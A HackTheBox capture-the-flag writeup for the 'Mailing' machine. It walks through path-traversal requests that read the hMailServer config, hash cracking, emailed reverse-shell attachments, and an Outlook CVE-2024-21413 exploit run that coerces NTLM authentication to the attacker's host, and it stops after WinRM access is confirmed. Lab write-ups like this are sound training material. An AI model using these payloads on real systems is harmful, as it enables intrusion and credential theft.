---
render_with_liquid: false
title: HackTheBox Writeup  Mailing
date: 2024-05-05 05:39:39 +1400
tags: [hackthebox, nmap, windows, feroxbuster, netexec, exiftool, iis, php, cariddi, local-file-inclusion, hmailserver, discover-secrets, crackstation, email, smtp, evolution, sendemail, microsoft-outlook, cve-2024-21413, client-side-attack, coerce-authentication, responder, hashcat, evil-winrm, enum, libre-office, cve-2023-2255, odt, defense-evasion, av-bypass, powercat, log-poisoning, telnet, webshell, reverse-ssh, potato-attacks, badpotato, amsi-bypass, oscp-like-2023]
---



Mailing is an easy Windows machine that runs `hMailServer` and hosts a website vulnerable to `Path Traversal`. This vulnerability can be exploited to access the `hMailServer` configuration file, revealing the Administrator password hash. Cracking this hash provides the Administrator password for the email account. We leverage [CVE-2024-21413](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21413) in the Windows Mail application on the remote host to capture the NTLM hash for user `maya`. We can then crack this hash to obtain the password and log in as user `maya` via WinRM. For privilege escalation, we exploit [CVE-2023-2255](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2255) in `LibreOffice`.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ pt init '10.129.58.96 mailing.htb Mailing'
+---------+--------+--------------+-------------+
| PROFILE | STATUS |      IP      |   DOMAIN    |
+---------+--------+--------------+-------------+
| mailing | on     | 10.129.58.96 | mailing.htb |
| mailing | on     | 10.129.58.96 | Mailing     |
+---------+--------+--------------+-------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun May  5 05:39:39 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,57348, Mailing
Nmap scan report for Mailing (10.129.56.233)
Host is up, received user-set (0.21s latency).
Scanned at 2024-05-05 05:39:39 CST for 599s

PORT      STATE SERVICE       REASON          VERSION
25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Mailing
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: NAMESPACE IMAP4rev1 completed SORT OK CHILDREN IMAP4 CAPABILITY QUOTA IDLE RIGHTS=texkA0001 ACL
445/tcp   open  microsoft-ds? syn-ack ttl 127
465/tcp   open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
993/tcp   open  ssl/imap      syn-ack ttl 127 hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_imap-capabilities: NAMESPACE IMAP4rev1 completed SORT OK CHILDREN IMAP4 CAPABILITY QUOTA IDLE RIGHTS=texkA0001 ACL
5040/tcp  open  unknown       syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?    syn-ack ttl 127
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57348/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 2818/tcp): CLEAN (Timeout)
|   Check 2 (port 22258/tcp): CLEAN (Timeout)
|   Check 3 (port 48397/udp): CLEAN (Timeout)
|   Check 4 (port 62312/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-05-04T21:49:54
|_  start_date: N/A
|_clock-skew: 1m02s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun May  5 05:49:38 2024 -- 1 IP address (1 host up) scanned in 598.78 seconds
```

## 80 - HTTP : Introduction about mailing service


### Info

```ruby
http://Mailing [200] [Mailing] [Microsoft-IIS/10.0] [IIS:10.0,PHP:8.3.3,Windows Server] [cb5cc18ebe3d7ba951d8bec12c7af6806cfbdf6e]
```

![](/assets/obsidian/d728df06599c3f202b1d0345ea961771.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ cat ferox_80.txt | grep -v '^4' | grep -vE 'http://mailing/assets/'
200      GET        1l        5w       31c http://mailing/download.php
301      GET        2l       10w      156c http://mailing/Assets => http://mailing/Assets/
301      GET        2l       10w      162c http://mailing/instructions => http://mailing/instructions/
200      GET      132l      375w     4681c http://mailing/
301      GET        2l       10w      162c http://mailing/Instructions => http://mailing/Instructions/
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ nxc smb $(pt get rhost) -u '' -p ''
SMB         10.129.56.233   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.56.233   445    MAILING          [-] MAILING\: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ nxc smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.56.233   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.56.233   445    MAILING          [-] MAILING\a: STATUS_LOGON_FAILURE
```

# User Flag
---

## Enumeration


### 80 - PHP site : Instructions PDF for mail service

![](/assets/obsidian/f396a2d00dc8082bbad6a1194841c75c.png)

- The author is `Ruy`, and he uses `Microsoft 365`

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ exiftool -a -u instructions.pdf
ExifTool Version Number         : 12.76
File Name                       : instructions.pdf
Directory                       : .
File Size                       : 1705 kB
File Modification Date/Time     : 2024:05:05 05:40:51+08:00
File Access Date/Time           : 2024:05:05 05:40:51+08:00
File Inode Change Date/Time     : 2024:05:05 05:40:51+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 16
Language                        : es
Tagged PDF                      : Yes
XMP Toolkit                     : 3.1-701
Producer                        : Microsoft® Word para Microsoft 365
Creator                         : Ruy Alonso Fernández
Creator Tool                    : Microsoft® Word para Microsoft 365
Create Date                     : 2024:03:11 18:46:08+01:00
Modify Date                     : 2024:03:11 18:46:08+01:00
Document ID                     : uuid:8E915C28-9456-4488-BB12-8E3445231916
Instance ID                     : uuid:8E915C28-9456-4488-BB12-8E3445231916
Author                          : Ruy Alonso Fernández
Creator                         : Microsoft® Word para Microsoft 365
Create Date                     : 2024:03:11 18:46:08+01:00
Modify Date                     : 2024:03:11 18:46:08+01:00
Producer                        : Microsoft® Word para Microsoft 365
```

- The instruction guides user how to setup mailing client on both linux and windows platform, collected a domain name : `mailing.htb`, add to hosts file

![](/assets/obsidian/8eb69445f20fd9721a435117d32e2239.png)

- Gathered a username : `maya`
- The target is on **windows machine**, and they use **Microsoft Outlook**

![](/assets/obsidian/25ae0fa954941b0f4f961dfc4b7b02f8.png)

## Shell as maya

### 80 - PHP site : LFI

- Crawl URLs and identify potential vulns based on parameter names

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ cat httpx/urls.txt | cariddi -rua -info -s -e -ext 4 -sr -intensive
                 _     _     _ _
                (_)   | |   | (_)
   ___ __ _ _ __ _  __| | __| |_
  / __/ _` | '__| |/ _` |/ _` | |
 | (_| (_| | |  | | (_| | (_| | |
  \___\__,_|_|  |_|\__,_|\__,_|_| v1.3.2

 > github.com/edoardottt/cariddi
 > edoardoottavianelli.it
========================================
http://mailing.htb:80
http://mailing.htb:80/assets/ruyalonso.jpg
http://mailing.htb:80/assets/mayabendito.jpg
http://mailing.htb:80/download.php?file=instructions.pdf
[ file - SQLi LFI ]  in http://mailing.htb:80/download.php?file=instructions.pdf
[ HTML comment ] <!-- Add more team members here --> in http://mailing.htb:80
```

- Confirmed arbitrary file read

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ curl 'http://mailing/download.php?file=../../../../../../../../../../../../WINDOWS/System32/drivers/etc/hosts'

# Copyright (c) 1993-2009 Microsoft Corp.

#

# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.

#

# This file contains the mappings of IP addresses to host names. Each

# entry should be kept on an individual line. The IP address should

# be placed in the first column followed by the corresponding host name.

# The IP address and the host name should be separated by at least one

# space.

#

# Additionally, comments (such as these) may be inserted on individual

# lines or following the machine name denoted by a '#' symbol.

#

# For example:

#

#      102.54.94.97     rhino.acme.com          # source server

#       38.25.63.10     x.acme.com              # x client host


# localhost name resolution is handled within DNS itself.

#       127.0.0.1       localhost

#       ::1             localhost

127.0.0.1       mailing.htb
```

- Confirmed `LFI` (Hangs while trying to include `php` files)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ curl 'http://mailing/download.php?file=../download.php'
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>500 - Error interno del servidor.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}

#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}

#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>500 - Internal server error.</h2>
  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

- PHP wrapper is unavailable, so we can't use `PHP filter chain to RCE`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ curl 'http://mailing/download.php?file=php://filter/convert.base64-encode/resource=../download.php'
File not found. 
```

- RFI is not vulnerable, neither with `HTTP` nor `SMB` protocol

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ http 'http://mailing/download.php?file=http://10.10.14.71/x.php'
HTTP/1.1 200 OK
Content-Length: 15
Content-Type: text/html; charset=UTF-8
Date: Sun, 05 May 2024 04:57:53 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
X-Powered-By: ASP.NET

File not found.


┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ http 'http://mailing/download.php?file=//10.10.14.71/s/x.php'
HTTP/1.1 200 OK
Content-Length: 15
Content-Type: text/html; charset=UTF-8
Date: Sun, 05 May 2024 04:58:07 GMT
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
X-Powered-By: ASP.NET

File not found.
```

### Obtain hmailserver's config file

- Google : `hmailserver config file location`

> https://www.hmailserver.com/documentation/v5.4/?page=ts_start_server

![](/assets/obsidian/0bdb4a772c8de2b506fb394ed8d5c0d2.png)

- Google : `hmailserver hMailServer.ini location`

> https://hmailserver.com/forum/viewtopic.php?t=39079

![](/assets/obsidian/1561d1774f375911219838a83fbeb9a2.png)

Got some passwords in md5

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ http 'http://mailing/download.php?file=../../../../../../../../../../../Program Files (x86)/hMailServer/Bin/hMailServer.ini'
HTTP/1.1 200 OK
Cache-Control: must-revalidate
Content-Description: File Transfer
Content-Disposition: attachment; filename="hMailServer.ini"
Content-Length: 604
Content-Type: application/octet-stream
Date: Sun, 05 May 2024 00:10:51 GMT
Expires: 0
Pragma: public
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
X-Powered-By: ASP.NET

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

### Crack hashes from hmailserver's config file

`AdministratorPassword` was cracked with https://crackstation.net/ : `homenetworkingadministrator`

![](/assets/obsidian/e5b0173476011429fe77141bf03c6833.png)

The password hash from `Database` section was encrypted, we will need external tools to decrypt it

- Google : `hMailServer crack database password github`

> https://github.com/GitMirar/hMailDatabasePasswordDecrypter

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit]
└─$ git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit]
└─$ cd hMailDatabasePasswordDecrypter

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/hMailDatabasePasswordDecrypter]
└─$ make
g++ blowfish.cpp main.cpp -o decrypt

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/hMailDatabasePasswordDecrypter]
└─$ ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c
6FC6F69152AD
```

### 25 - SMTP : Login with admin and enumerate

I will use a GUI client : **Evolution** to enumerate mails

- There's nothing in Inbox, Junk and Trash 

![](/assets/obsidian/dbdcf5726a7cde2937880c630f5ddadd.png)

I sent some reverse shells to `maya` and expect there's a bot that will open it, but it doesn't work

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ sendemail -f administrator@mailing.htb -s mailing.htb -xu administrator@mailing.htb -xp homenetworkingadministrator -t maya@mailing.htb -u 'Test' -m 'Helo' -a ~/www/rev.ps1
May 06 08:37:37 fsociety sendemail[3237412]: Email was sent successfully!

┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ sendemail -f administrator@mailing.htb -s mailing.htb -xu administrator@mailing.htb -xp homenetworkingadministrator -t maya@mailing.htb -u 'Test' -m 'Helo' -a ~/www/rev.exe
May 06 08:38:31 fsociety sendemail[3239275]: Email was sent successfully!
```

### Client side attack - Microsoft Outlook : RCE (CVE-2024-21413)

- Google : `Microsoft Outlook exploit`

> https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

The first demo was about coercing NTLM auth, lets try it

![](/assets/obsidian/b7934d9134735fcd0f6fedec3411534b.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ sudo responder -A -I tun0 -v
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit]
└─$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit]
└─$ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

┌──(bravosec㉿fsociety)-[~/htb/Mailing/exploit/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\10.10.14.8\x" --subject "Testa"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```

> Since I didn't get a callback right after running the exploit, I decided to use a loop
{: .prompt-tip }

![](/assets/obsidian/6481d84ad366dc06ddb6dc5bd7c6c7ed.png)

### Crack NET NTLM hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ hashcat loot/ntlm.hash /opt/wordlists/rockyou.txt
[...]

┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ hashcat loot/ntlm.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

MAYA::MAILING:695ba27f4a5a5e2f:6c9af583cb0ca4243d9927ac36727a0c:010100000000000080eac145999fda015eca212123febee8000000000200080044004b005500430001001e00570049004e002d0044003100500059004a0038005100510045004b005a0004003400570049004e002d0044003100500059004a0038005100510045004b005a002e0044004b00550043002e004c004f00430041004c000300140044004b00550043002e004c004f00430041004c000500140044004b00550043002e004c004f00430041004c000700080080eac145999fda010600040002000000080030003000000000000000000000000020000037a3560c0e40642a04cd18021c12f794c4d56538bd8aee8c4ea09558314b02710a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0038000000000000000000:m4y4ngs4ri
```

### Evil-winrm

Validate the creds and auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ nxc smb $(pt get rhost) -u 'maya' -p 'm4y4ngs4ri'
SMB         10.129.105.11   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.105.11   445    MAILING          [+] MAILING\maya:m4y4ngs4ri

┌──(bravosec㉿fsociety)-[~/htb/Mailing]
└─$ nxc winrm $(pt get rhost) -u 'maya' -p 'm4y4ngs4ri'
WINRM       10.129.105.11   5985   MAILING          [*] Windows 10 / Server 2019 Build 19041 (name:MAILING) (domain:MAILING)
WINRM       10.129.105.11   5985   MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Mailing]
